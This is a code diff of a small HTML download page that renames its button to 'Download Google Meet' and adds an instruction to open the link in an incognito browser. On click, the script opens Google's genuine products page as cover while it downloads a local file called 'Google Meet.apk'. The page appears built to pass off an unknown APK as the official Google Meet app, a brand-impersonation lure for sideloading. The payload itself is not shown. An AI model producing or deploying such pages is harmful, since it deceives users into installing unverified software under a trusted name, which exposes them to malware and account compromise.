@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Download APK</title>
+  <title>Download Meet</title>
 </head>
 <body>
 
 <br/><br/>
-<button id="downloadBtn">Download APK</button>
+  <h2>Open this link in a newly launched browser - Incognito</h2>
+<button id="downloadBtn">Download Google Meet</button>
 
 <script>
 
@@ -16,8 +17,8 @@ document.getElementById("downloadBtn").addEventListener("click", function () {
     window.open("https://about.google/products/", "");
     
     const link = document.createElement("a");
-    link.href = "Google Meet.apk"; // URL to your APK file
-    link.download = "Google Meet.apk"; // optional suggested filename
+    link.href = "Google Meet.apk";
+    link.download = "Google Meet.apk";
     document.body.appendChild(link);
 
     
@@ -33,10 +34,9 @@ document.getElementById("downloadBtn").addEventListener("click", function () {
     
     }, 3000);
     
-  
-    
 });
 </script>
 
 </body>
 </html>
+
